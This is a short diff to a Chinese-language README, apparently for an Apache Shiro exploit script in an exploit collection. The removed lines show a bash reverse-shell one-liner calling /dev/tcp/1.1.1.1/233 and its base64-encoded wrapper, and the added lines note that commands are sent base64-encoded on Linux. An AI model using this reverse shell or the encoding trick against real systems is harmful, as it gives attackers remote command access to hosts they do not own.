@@ -20,21 +20,12 @@ Apache Shiro
 +-------------------------------------------------------------------------------------------------------+
 ```
 
-脚本内置了base64编码，但是仅适配Linux，如果测试Windows手动删除base64加密部分即可  
-也可以前往以下连接手动base64加密  
-http://www.jackson-t.ca/runtime-exec-payloads.html
-Original: 
-```
-bash -i >&/dev/tcp/1.1.1.1/233 0>&1     
-```
-
-Encoding：
-```
-bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMjMzIDA+JjE=}|{base64,-d}|{bash,-i}
-```
-
-</details>
-
+Linux系统使用base64编码发送命令，Windows发送默认字符  
 利用示例：  
 ![images](https://github.com/zhzyker/exphub/tree/master/shiro/image/1.gif)
 ![images](https://github.com/zhzyker/exphub/tree/master/shiro/image/2.gif)
+
+</details>
+
+
+
